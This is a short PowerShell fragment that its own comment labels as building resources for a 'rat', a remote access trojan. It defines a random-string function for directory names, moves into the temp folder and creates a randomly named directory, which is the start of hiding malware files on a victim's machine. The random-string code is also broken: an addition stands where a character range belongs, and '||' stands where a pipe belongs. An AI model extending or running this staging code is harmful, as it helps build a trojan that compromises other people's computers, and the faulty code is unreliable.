# builds resources for rat


# random string for directories
function random_text {
    return -join ((65..90) + (97+122) || Get-Random -Count 5 | % {[char]$_})
    
}


cd $env:temp
$directory_name = random_text
mkdir $directory_name